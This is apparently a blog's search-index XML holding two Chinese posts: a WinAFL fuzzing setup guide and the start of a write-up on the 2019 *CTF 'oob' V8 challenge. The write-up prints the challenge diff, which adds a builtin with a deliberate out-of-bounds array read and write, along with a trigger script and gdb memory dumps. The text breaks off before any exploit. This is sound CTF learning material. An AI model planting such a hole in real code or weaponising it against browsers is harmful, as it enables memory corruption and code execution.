<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Winafl 环境搭建</title>
      <link href="posts/4c8662b0/"/>
      <url>posts/4c8662b0/</url>
      
        <content type="html"><![CDATA[<h1 id="winAFL-环境搭建"><a href="#winAFL-环境搭建" class="headerlink" title="winAFL 环境搭建"></a>winAFL 环境搭建</h1><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>版本：    Windows 10 专业版</p><p>版本号：    20H2</p><h1 id="winAFL-搭建"><a href="#winAFL-搭建" class="headerlink" title="winAFL 搭建"></a>winAFL 搭建</h1><h2 id="Installing-Visual-Studio-2017-Installing-Visual-Studio-2019"><a href="#Installing-Visual-Studio-2017-Installing-Visual-Studio-2019" class="headerlink" title="Installing Visual Studio 2017 / Installing Visual Studio 2019"></a>Installing Visual Studio 2017 / Installing Visual Studio 2019</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://x9security.com/wp-content/uploads/2020/09/Installing_vs2017.png"></p><h2 id="Installing-git-amp-cmake-amp-python2"><a href="#Installing-git-amp-cmake-amp-python2" class="headerlink" title="Installing git &amp; cmake &amp; python2"></a>Installing git &amp; cmake &amp; python2</h2><h2 id="Installing-DynamoRIO-amp-WinAFL"><a href="#Installing-DynamoRIO-amp-WinAFL" class="headerlink" title="Installing DynamoRIO &amp; WinAFL"></a>Installing DynamoRIO &amp; WinAFL</h2><p>下载 <a href="https://github.com/googleprojectzero/winafl">WINAFL</a>：<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p>下载<a href="https://github.com/DynamoRIO/dynamorio/releases">DynamoRIO</a>：<a href="https://github.com/DynamoRIO/dynamorio/releases">https://github.com/DynamoRIO/dynamorio/releases</a></p><p>下载后把二者解压到同一文件夹下，如 <code>myafl</code>，手动编译 <code>x64</code>环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\air\Desktop&gt;cd myafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl&gt;cd winafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;mkdir build64</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;cd build64</span><br><span class="line">if VS2019</span><br><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br><span class="line"></span><br><span class="line">if VS2017</span><br><span class="line">cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake </span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><h2 id="DynamoRIO"><a href="#DynamoRIO" class="headerlink" title="DynamoRIO"></a>DynamoRIO</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 1. 后面跟 &lt;客户端&gt; &lt;客户端 参数&gt; —(分割线) &lt;目标程序 和 目标程序参数&gt;</span><br><span class="line">-c &lt;client&gt; [client options] — &lt;app and args to run&gt;</span><br><span class="line">&#x2F;&#x2F; 2.1 winafl.dll 参数说明。这也是插桩参数的使用[instrumentation options]</span><br><span class="line">-debug # debug模式, 它会生成一个log文件</span><br><span class="line">-target_module # 目标程序(只能有一个), 也是target_offset所在的模块</span><br><span class="line">-target_offset # 目标程序偏移，相对于target_module的偏移，在method无法导出的时候使用</span><br><span class="line">-fuzz_iterations # 目标程序重新启动一次内运行目标函数(即target_method)的最大迭代数</span><br><span class="line">-nargs # 目标程序执行所需要的参数个数(包括目标程序本身)</span><br><span class="line">-target_module # 目标函数,需要export或者调试符号(pdb)</span><br><span class="line">-coverage_module # 计算覆盖率的模块,也就是目标程序会调用的模块(dll); (可以有多个)</span><br></pre></td></tr></table></figure><h2 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-i dir        - input directory with test cases</span><br><span class="line">-o dir        - output directory for fuzzer findings</span><br><span class="line">-t msec       - timeout for each run</span><br><span class="line">-D dir        - directory containing DynamoRIO binaries (drrun, drconfig)</span><br><span class="line">-P            - use Intel PT tracing mode</span><br><span class="line">-Y            - enable the static instrumentation mode</span><br><span class="line">-f file       - location read by the fuzzed program</span><br><span class="line">-m limit      - memory limit for the target process</span><br><span class="line">-p            - persist DynamoRIO cache across target process restarts</span><br><span class="line">-c cpu        - the CPU to run the fuzzed program</span><br><span class="line">-d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">-n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">-x dir        - optional fuzzer dictionary</span><br><span class="line">-I msec       - timeout for process initialization and first run</span><br><span class="line">-T text       - text banner to show on the screen</span><br><span class="line">-M \\ -S id   - distributed mode</span><br><span class="line">-C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">-l path       - a path to user-defined DLL for custom test cases processing</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -i C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\tiff -o C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\in -covtype edge -coverage_module xxx.dll -target_module xxx.exe -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">.\afl-fuzz.exe -i in -o out -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -- -target_module xxx.exe -coverage_module xxx.dll -target_offset xxx -nargs 2 -- xxx.exe @@</span><br></pre></td></tr></table></figure></blockquote><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><h2 id="cmin"><a href="#cmin" class="headerlink" title="cmin"></a>cmin</h2><p>[-] PROGRAM ABORT : Unexpected result from pipe! expected ‘P’, instead received ‘C’</p><p>put <code>winafl-cmin.py</code> <code>winafl.dll</code> and other winafl program in the same directory as your test program.</p><p>test <code>winafl-cmin.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -i  D:\Dropbox\fuzzing\test\input  -o D:\Dropbox\fuzzing\test\minset -covtype edge -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -v -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><p>test <code>afl-fuzz.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i D:\Dropbox\fuzzing\test\minset -o output -M master -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -- -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/googleprojectzero/winafl/issues/179">https://github.com/googleprojectzero/winafl/issues/179</a></p><p><a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p><a href="https://x9security.com/installing-winafl/">https://x9security.com/installing-winafl/</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-StarCtf-oob</title>
      <link href="posts/7eb4a1e6/"/>
      <url>posts/7eb4a1e6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过 <code>2019-starctf</code>的一道例题尝试入门 <code>v8</code>。跟着前辈们学习并记录一下自己的复现路程。</p><p>环境：Ubuntu 18.04</p><p>题目：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">下载链接</a>:<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>翻墙 翻墙 翻墙</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="comment">#下载谷歌源码管理器</span></span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/depot_tools  <span class="comment">#加入环境变量</span></span><br><span class="line">$ mkdir chromium</span><br><span class="line">$ <span class="built_in">cd</span> chromium</span><br><span class="line">$ fetch --no-history v8  <span class="comment">#获取v8源码</span></span><br><span class="line">$ <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><p>把题目给出的<code>diff</code>文件应用到源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">$ gclient sync <span class="comment">#同步solution的各个仓库</span></span><br><span class="line">$ git apply ../oob.diff  <span class="comment">#将diff文件加入到v8中源代码分支中</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release <span class="comment"># Release version</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug <span class="comment"># Debug version</span></span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8流程"><a href="#V8流程" class="headerlink" title="V8流程"></a>V8流程</h3><p><code>JavaScript</code>是一门解释型语言，而<code>v8</code>则是<code>chrome</code>浏览器的<code>JavaScript</code>解析引擎，大多数漏洞都是由<code>v8</code>所引起的 (<code>v8</code>编译过后的可执行文件是<code>d8</code>).</p><p><code>JavaScript</code>的执行流程大致如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200922110125.png" alt="image-20200921161412221"></p><ul><li>JS 源代码经过词法分析形成 <code>Token</code>，解析器(Parser)解析<code>token</code>形成抽象语法树(AST)</li><li>解释器(Ignition)将 AST 生成可执行的字节码。解释器可以直接执行字节码，或者通过编译器将其编译为二进制的机器代码再执行。</li><li>解释器执行字节码过程中，如果发现代码被重复执行，热点代码(HotSpot)超过阈值后就会丢给优化编译器(TurboFan)编译成二进制代码，然后优化。下次再执行时则直接执行这段优化后的二进制代码。</li><li>如果JS对象发生变更，优化后的二进制代码变为无效代码，编译器执行反优化，下次执行就回退到解释器解释执行。</li></ul><h3 id="V8调试"><a href="#V8调试" class="headerlink" title="V8调试"></a>V8调试</h3><p>入这个选项就可以在<code>js</code>中调用一些有助于调试的本地运行时函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure><p>PS:v8团队的专门编写了一个<code>gdb</code>的<code>gdbinit</code>脚本。在<code>~/xxx/v8/tools</code>下，将其更名为<code>gdbinit_v8</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cp gdbinit_v8 ~/.gdbinit_v8</span><br><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ vim .gdbinit</span><br><span class="line"><span class="comment">#加入下面内容</span></span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br><span class="line"><span class="built_in">source</span> User/xxx/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>有两个常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">job [address_of_obj]  # gdbinit_v8中的特有命令，打印出对象内存结构，注意对象地址为其实际地址加1</span><br><span class="line">telescope [real_address] [num] # pwndbg命令，打印出real_address地址处num个内存单元的值，该地址为真实地址</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;focu5&#x2F;chromium&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">...</span><br><span class="line">DebugPrint: 0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line">pwndbg&gt; job 0x2658b5f8df19</span><br><span class="line">0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>PS：在<code>release</code>使用 <code>job</code>命令会报`No symbol “_v8_internal_Print_Object” in current context. 的错误</p><table><thead><tr><th align="center">map</th><th align="center">表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</th></tr></thead><tbody><tr><td align="center">prototype</td><td align="center">prototype</td></tr><tr><td align="center">elements</td><td align="center">对象元素</td></tr><tr><td align="center">length</td><td align="center">元素个数</td></tr><tr><td align="center">properties</td><td align="center">属性</td></tr></tbody></table><blockquote><p>Value B is an 8 bytes long value //in x64.<br>If B is a double:<br>    B is the binary representation of a double<br>Else:<br>    if B is a int32:<br>        B = the value of B &lt;&lt; 32 // which mean 0xdeadbeef is 0xdeadbeef00000000 in v8<br>    else: // B is a pointer<br>        B = B | 1</p></blockquote><p><code>v8</code>在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1。例：上述 elements的实际地址应为 <code>0x2658b5f8de39-1</code></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析题目所给出的<code>diff</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  &#x2F;&#x2F; namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len &#x3D; args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len &#x3D;&#x3D; 1)&#123;</span><br><span class="line">+        &#x2F;&#x2F;read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        &#x2F;&#x2F;write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   &#x2F;* https:&#x2F;&#x2F;tc39.github.io&#x2F;proposal-flatMap&#x2F;#sec-Array.prototype.flatMap *&#x2F;   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   &#x2F;* ArrayBuffer *&#x2F;                                                            \</span><br><span class="line">   &#x2F;* ES #sec-arraybuffer-constructor *&#x2F;                                        \</span><br><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;typer.cc b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     &#x2F;&#x2F; ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><ul><li>自定义了一个函数kArrayOob，可以通过oob调用</li><li>该函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li><li>如果只有一个参数（<code>this</code>），则会返回<code>array[length]</code>。</li><li>如果有两个参数（<code>this</code>和<code>value</code>），它将<code>value</code>作为一个浮点数写入<code>array[length]</code>。(以上所述的参数均为cpp中)</li><li>上述逻辑转换为JavaScript中的对应逻辑就是，当<code>oob</code>函数的参数为空时，返回数组对象第length个元素内容；当<code>oob</code>函数参数个数不为0时，就将第一个参数写入到数组中的第length个元素位置。</li></ul><p>编写<code>test.js</code>如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> addr = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return addr:&quot;</span> + addr.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x25641fd4ddd9-1</span><br><span class="line">00:0000│   0x25641fd4ddd8 —▸ 0xe46856c2d99 ◂— 0x400003e40e90401&lt;--- map</span><br><span class="line">01:0008│   0x25641fd4dde0 —▸ 0x3e40e9040c71 ◂— 0x3e40e90408&lt;--- properties</span><br><span class="line">02:0010│   0x25641fd4dde8 —▸ 0x25641fd4dd69 ◂— 0x3e40e90408&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4ddf0 ◂— 0x300000000&lt;--- length</span><br><span class="line">04:0020│   0x25641fd4ddf8 ◂— 0x0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000&lt;--- length</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 